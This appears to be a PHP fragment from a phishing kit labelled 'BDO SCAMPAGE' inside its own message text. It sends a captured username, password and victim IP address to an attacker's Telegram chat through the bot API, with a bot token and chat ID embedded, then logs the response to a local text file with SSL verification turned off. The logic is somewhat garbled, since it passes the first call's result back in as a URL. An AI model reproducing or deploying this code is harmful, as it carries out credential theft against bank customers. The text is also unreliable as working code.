<?php


$f1 = file_get_contents("https://api.telegram.org/bot6058365748:AAELIRCm9Y5_eiP9PYAyKT9NJCLCSUQFmNU/sendMessage?chat_id=-1001702730889&text=%5BBDO+SCAMPAGE%5D+%0A%0A+%5B%2B%5D+TrueLog%3A+No%0A%5B%2B%5D+USERNAME%3A+test%0A%5B%2B%5D+Password%3A+test%0A%5B%2B%5D+IP%3A+136.158.48.6");


$url= 'https://example.com';

$arrContextOptions=array(
      "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
    );  

$response = file_get_contents($f1, false, stream_context_create($arrContextOptions));

    $fp = fopen("tllo1gs.txt", "a");
fputs($fp, "$response \n\n");
